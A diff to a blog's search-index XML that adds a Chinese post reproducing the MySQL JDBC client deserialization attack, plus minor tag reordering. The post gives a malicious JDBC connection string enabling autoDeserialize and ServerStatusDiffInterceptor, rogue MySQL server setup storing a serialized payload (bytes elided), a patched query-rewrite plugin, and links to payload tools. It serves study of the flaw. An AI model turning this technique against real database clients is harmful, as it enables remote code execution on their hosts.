@@ -4,6 +4,25 @@
   
   
   <entry>
+    <title>MySQL JDBC 客户端反序列化</title>
+    <link href="/2020/07/02/MySQL-JDBC-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    <url>/2020/07/02/MySQL-JDBC-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 挺有意思的 Java 反序列化利用方式，有种 PHP 的 MySQL phar 反序列化的感觉，学习学习。</p><a id="more"></a><hr><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>简单地新建一个 Java 类，配置好编译输出目录和 maven：</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;mysql&lt;/groupId&gt;    &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;    &lt;version&gt;8.0.19&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;commons-collections&lt;/groupId&gt;    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;    &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>然后编写测试代码：</p><pre><code class="java">import java.sql.*;public class JDBC {    public static void main ( String[] argv ) throws Exception {        String url = &quot;jdbc:mysql://*.*.*.*:*/jdbc?useSSL=false&amp;user=root&amp;password=root&amp;&quot; +                &quot;autoDeserialize=true&amp;allowPublicKeyRetrieval=true&amp;&quot; +                &quot;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;;        Connection conn = DriverManager.getConnection(url);    }}</code></pre><p>DriverManager 会通过 SPI 的方式加载 MySQL 驱动，不需要像参考文章那样加一句：</p><pre><code class="java">String driver = &quot;com.mysql.jdbc.Driver&quot;;Class.forName(driver);</code></pre><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>ServerStatusDiffInterceptor 类的 populateMapWithSessionStatusValues 函数会执行一句 SQL 语句，然后将执行结果放入 Map 中：</p><pre><code class="java">private void populateMapWithSessionStatusValues(Map&lt;String, String&gt; toPopulate) {    java.sql.Statement stmt = null;    java.sql.ResultSet rs = null;    try {        try {            toPopulate.clear();            stmt = this.connection.createStatement();            rs = stmt.executeQuery(&quot;SHOW SESSION STATUS&quot;);            ResultSetUtil.resultSetToMap(toPopulate, rs);        }        ...    }     ...}</code></pre><p>而 resultSetToMap 函数会调用 ResultSet 接口实现的 getObject：</p><pre><code class="java">public static void resultSetToMap(Map mappedValues, ResultSet rs) throws SQLException {    while (rs.next()) {        mappedValues.put(rs.getObject(1), rs.getObject(2));    }}</code></pre><p>这里调用的是 ResultSetImpl 类的 getObject，当字段类型为 BIT 或者  BLOB 的时候，会进行反序列化：</p><pre><code class="java">case BLOB:if (field.isBinary() || field.isBlob()) {    byte[] data = getBytes(columnIndex);    if (this.connection.getPropertySet().getBooleanProperty(PropertyKey.autoDeserialize).getValue()) {        Object obj = data;        if ((data != null) &amp;&amp; (data.length &gt;= 2)) {            if ((data[0] == -84) &amp;&amp; (data[1] == -19)) {                // Serialized object?                try {                    ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);                    ObjectInputStream objIn = new ObjectInputStream(bytesIn);                    obj = objIn.readObject();                    objIn.close();                    bytesIn.close();                }                 ...            } else {                return getString(columnIndex);            }        }        return obj;    }    return data;}return getBytes(columnIndex);</code></pre><p>而 ServerStatusDiffInterceptor 类是实现了 QueryInterceptor 接口的一个类，这个接口代表的是 MySQL 连接串中的一个参数，<a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-configuration-properties.html" target="_blank" rel="noopener">官方文档</a>中对这个参数的描述是：</p><pre><code>queryInterceptorsA comma-delimited list of classes that implement &quot;com.mysql.cj.interceptors.QueryInterceptor&quot; that should be placed &quot;in between&quot; query execution to influence the results. QueryInterceptors are &quot;chainable&quot;, the results returned by the &quot;current&quot; interceptor will be passed on to the next in in the chain, from left-to-right order, as specified in this property.Since version: 8.0.7</code></pre><p>简单来说就是在 SQL 查询之间插入的 SQL 操作，而建立连接时会执行的 set autocommit=1 等操作正好可以触发，所以如果可以控制 JDBC 连接串，就可以通过设置 queryInterceptors 的方式让客户端反序列化我们返回的数据，具体危害程度由客户端的环境决定。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>可以参考这位大师傅的做法：<a href="https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload" target="_blank" rel="noopener">https://github.com/codeplutos/MySQL-JDBC-Deserialization-Payload</a></p><p>也可以用这个工具：<a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>自己建立一个数据表存放序列化攻击数据，然后通过 MySQL 插件将 SHOW SESSION STATUS 请求重写为从该表中 select 数据，从而达到控制返回数据的目的。</p><p>用 docker 开一个 MySQL，首先新建一个表用来存放序列化数据：</p><pre><code class="mysql">mysql&gt; create database jdbc;Query OK, 1 row affected (0.03 sec)mysql&gt; use jdbc;Database changedmysql&gt; create table jdbc(data1 blob, data2 blob);Query OK, 0 rows affected (0.02 sec)mysql&gt; set @bytes=0xaced...78;Query OK, 0 rows affected (0.00 sec)mysql&gt; insert into jdbc values(@bytes, @bytes);Query OK, 1 row affected (0.01 sec)</code></pre><p>然后嫌麻烦不想自己编译一个新的扩展，所以直接使用 GitHub 上给出的扩展，然后用 IDA 简单地 patch 一下修改掉字符串，最后大概变成了这个样子：</p><pre><code class="c">v4 = strcasecmp(v3, &quot;SHOW SESSION STATUS&quot;) == 0;std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::~basic_string(&amp;v14, &quot;SHOW SESSION STATUS&quot;);std::allocator&lt;char&gt;::~allocator(&amp;v10);if ( v4 ){    strcpy(s, &quot;select `data1`, `data2` from jdbc.jdbc;#NAME`, `ID`, `IS_DEFAULT`, `IS_COMPILED`, `SORTLEN` from codeplutos.payload&quot;);    v5 = (__int64 (__fastcall *)(_QWORD, size_t, _QWORD))*mysql_malloc_service;    ...}...</code></pre><p>然后将扩展装上去试一发：</p><pre><code class="sql">mysql&gt; install plugin rewrite_example soname &quot;rewrite_example.so&quot;;mysql&gt; SHOW SESSION STATUS;</code></pre><p>可以看到重写已经生效了，最后用 IDEA 来一发，可以看到成功弹出计算器，实验成功。</p><hr><p>参考文章：</p><p><a href="https://paper.seebug.org/1227" target="_blank" rel="noopener">https://paper.seebug.org/1227</a></p><p><a href="https://www.anquanke.com/post/id/203086" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203086</a></p>]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>Web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>逆向花指令入门</title>
     <link href="/2020/06/29/%E9%80%86%E5%90%91%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%85%A5%E9%97%A8/"/>
     <url>/2020/06/29/%E9%80%86%E5%90%91%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%85%A5%E9%97%A8/</url>
@@ -191,9 +210,9 @@
       
       <tag>Web</tag>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -1068,9 +1087,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
@@ -1110,9 +1129,9 @@
     
     <tags>
       
-      <tag>二进制</tag>
-      
       <tag>复现</tag>
+      
+      <tag>二进制</tag>
       
     </tags>
     
